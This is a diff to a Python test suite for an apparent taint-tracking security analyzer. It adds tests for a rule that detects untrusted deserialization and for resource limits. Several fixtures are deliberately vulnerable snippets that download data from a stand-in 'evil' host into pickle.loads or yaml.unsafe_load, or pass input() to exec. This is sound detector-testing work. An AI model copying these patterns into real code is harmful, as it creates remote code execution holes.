@@ -18,6 +18,7 @@
 from __future__ import annotations
 
 from skillspector.nodes.analyzers import behavioral_taint_tracking
+from skillspector.state import WorkflowResourceBudget
 
 
 def _run(code: str, filename: str = "script.py") -> list:
@@ -131,6 +132,47 @@ class TestExternalInputToExec:
         findings = _run(code)
         tt5 = [f for f in findings if f.rule_id == "TT5"]
         assert len(tt5) >= 1
+
+
+# ── TT6: External / file input → deserialization sink ──────────────────
+
+
+class TestUntrustedDeserialization:
+    def test_network_to_pickle_loads(self):
+        code = (
+            "import requests, pickle\n"
+            'blob = requests.get("http://evil/payload").content\n'
+            "obj = pickle.loads(blob)\n"
+        )
+        findings = _run(code)
+        tt6 = [f for f in findings if f.rule_id == "TT6"]
+        assert len(tt6) >= 1
+        assert tt6[0].severity == "HIGH"
+        assert "deserialization" in tt6[0].message
+
+    def test_file_read_to_pickle_load(self):
+        code = 'import pickle\nobj = pickle.load(open("bundled.pkl", "rb"))\n'
+        findings = _run(code)
+        assert any(f.rule_id == "TT6" for f in findings)
+
+    def test_user_input_to_pickle_loads(self):
+        code = "import pickle\npickle.loads(input())\n"
+        findings = _run(code)
+        assert any(f.rule_id == "TT6" for f in findings)
+
+    def test_network_to_yaml_unsafe_load(self):
+        code = (
+            "import requests, yaml\n"
+            'data = requests.get("http://evil").text\n'
+            "yaml.unsafe_load(data)\n"
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT6" for f in findings)
+
+    def test_constant_argument_no_tt6(self):
+        code = 'import pickle\npickle.loads(b"\\x80\\x04constant")\n'
+        findings = _run(code)
+        assert not any(f.rule_id == "TT6" for f in findings)
 
 
 # ── TT1: Direct source-to-sink (generic) ───────────────────────────────
@@ -569,3 +611,54 @@ class TestInspectionLedgerResponse:
         assert [event["path"] for event in result["inspection_ledger"]] == ["broken.py"]
         assert result["inspection_ledger"][0]["reason_code"] == "syntax_error"
         assert result["analyzer_status_events"][0]["status"] == "degraded"
+
+
+class TestResourceBounds:
+    @staticmethod
+    def _flows(prefix: str, count: int) -> str:
+        return "\n".join(
+            f"{prefix}{index} = input()\nexec({prefix}{index})" for index in range(count)
+        )
+
+    def test_finding_caps_stop_construction_and_account_remaining_work(self, monkeypatch) -> None:
+        monkeypatch.setattr(behavioral_taint_tracking, "MAX_FINDINGS_PER_ARTIFACT", 2)
+        monkeypatch.setattr(behavioral_taint_tracking, "MAX_FINDINGS_PER_ANALYZER", 3)
+        result = behavioral_taint_tracking.node(
+            {
+                "components": ["a.py", "b.py", "c.py"],
+                "file_cache": {
+                    "a.py": self._flows("a", 4),
+                    "b.py": self._flows("b", 2),
+                    "c.py": self._flows("c", 1),
+                },
+            }
+        )
+
+        assert len(result["findings"]) == 3
+        assert [event["outcome"] for event in result["inspection_ledger"]] == [
+            "partial",
+            "partial",
+            "partial",
+        ]
+        assert result["inspection_ledger"][0]["limit_findings"] == 2
+        assert result["inspection_ledger"][1]["limit_findings"] == 3
+        assert result["inspection_ledger"][2]["emitted_finding_ids"] == []
+        assert result["analyzer_status_events"][0]["status"] == "degraded"
+
+    def test_expired_workflow_deadline_marks_every_python_target_partial(self) -> None:
+        result = behavioral_taint_tracking.node(
+            {
+                "components": ["a.py", "b.py"],
+                "file_cache": {
+                    "a.py": self._flows("a", 1),
+                    "b.py": self._flows("b", 1),
+                },
+                "workflow_resource_budget": WorkflowResourceBudget(max_seconds=0.0),
+            }
+        )
+
+        assert result["findings"] == []
+        assert [event["reason_code"] for event in result["inspection_ledger"]] == [
+            "runtime_limit",
+            "runtime_limit",
+        ]
